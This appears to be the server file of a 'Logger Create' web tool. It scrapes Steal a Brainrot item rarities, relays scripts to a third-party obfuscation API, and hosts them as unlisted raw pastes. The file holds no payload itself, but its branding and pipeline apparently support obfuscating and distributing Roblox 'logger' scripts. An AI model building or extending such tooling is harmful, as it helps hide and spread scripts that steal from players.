import express from "express";
import axios from "axios";
import * as cheerio from "cheerio";
import rateLimit from "express-rate-limit";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = process.env.PORT || 3000;
const PASTEFY_API_KEY = process.env.PASTEFY_API_KEY || "";

app.use(express.json({ limit: "2mb" }));

// ── Brainrot scraper ────────────────────────────────────────────
const BRAINROT_URL = "https://www.eldorado.gg/blog/all-brainrots-in-steal-a-brainrot/";
const RARITIES = ["OG", "Secret", "Brainrot God", "Mythic", "Legendary", "Epic", "Rare", "Common"];

let brainrotsData = {};
RARITIES.forEach(r => (brainrotsData[r] = []));
let flatBrainrots = [];

function cleanText(text) {
  return text.replace(/\s+/g, " ").trim();
}

async function updateBrainrots() {
  try {
    const res = await axios.get(BRAINROT_URL, { timeout: 15000 });
    const $ = cheerio.load(res.data);
    const newData = {};
    RARITIES.forEach(r => (newData[r] = []));

    $("table tr").each((_, row) => {
      const cells = $(row)
        .find("td")
        .map((_, td) => cleanText($(td).text()))
        .get();
      if (cells.length < 2) return;
      const name = cells[0];
      const rarity = cells.find(c => RARITIES.includes(c));
      if (!name || !rarity) return;
      const nameLower = name.toLowerCase();
      if (
        RARITIES.includes(name) ||
        nameLower.includes("brainrot") ||
        nameLower === "name" ||
        nameLower === "smurf cat"
      )
        return;
      if (!newData[rarity].includes(name)) newData[rarity].push(name);
    });

    brainrotsData = newData;
    flatBrainrots = [];
    RARITIES.forEach(r => flatBrainrots.push(...newData[r]));
    console.log("Brainrots updated. Total:", flatBrainrots.length);
  } catch (err) {
    console.error("Failed to update brainrots:", err.message);
  }
}

updateBrainrots();
setInterval(updateBrainrots, 60 * 60 * 1000); // her saat güncelle

// ── API Routes ──────────────────────────────────────────────────

app.get("/api/brainrots", (req, res) => {
  res.json(brainrotsData);
});

app.post(
  "/api/obfuscate",
  rateLimit({ max: 5, windowMs: 60_000, standardHeaders: true, legacyHeaders: false }),
  async (req, res) => {
    const { script } = req.body;
    if (!script) return res.status(400).json({ error: "script is required" });
    try {
      const r = await axios.post(
        "https://wearedevs.net/api/obfuscate",
        { script },
        { headers: { "Content-Type": "application/json" }, timeout: 30000 }
      );
      res.json(r.data);
    } catch (e) {
      console.error("obfuscate:", e.message);
      res.status(500).json({ error: "Obfuscation failed" });
    }
  }
);

app.post(
  "/api/pastefy",
  rateLimit({ max: 3, windowMs: 60_000, standardHeaders: true, legacyHeaders: false }),
  async (req, res) => {
    const { content } = req.body;
    if (!content) return res.status(400).json({ error: "content is required" });
    try {
      const r = await axios.post(
        "https://pastefy.app/api/v2/paste",
        {
          title: "Logger Create .gg/loggercreate",
          content,
          visibility: "UNLISTED",
          encrypted: false,
        },
        {
          headers: {
            "Content-Type": "application/json",
            ...(PASTEFY_API_KEY ? { Authorization: `Bearer ${PASTEFY_API_KEY}` } : {}),
          },
          timeout: 30000,
        }
      );
      if (!r.data.paste?.id)
        return res.status(500).json({ error: "Invalid response from Pastefy" });
      res.json({
        raw_url: `https://pastefy.app/${r.data.paste.id}/raw`,
        paste_id: r.data.paste.id,
      });
    } catch (e) {
      console.error("pastefy:", e.message);
      res.status(500).json({ error: "Failed to upload to Pastefy" });
    }
  }
);

// ── Frontend (build sonrası dist/ klasörünü serve eder) ─────────
app.use(express.static(path.join(__dirname, "dist")));
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "dist", "index.html"));
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
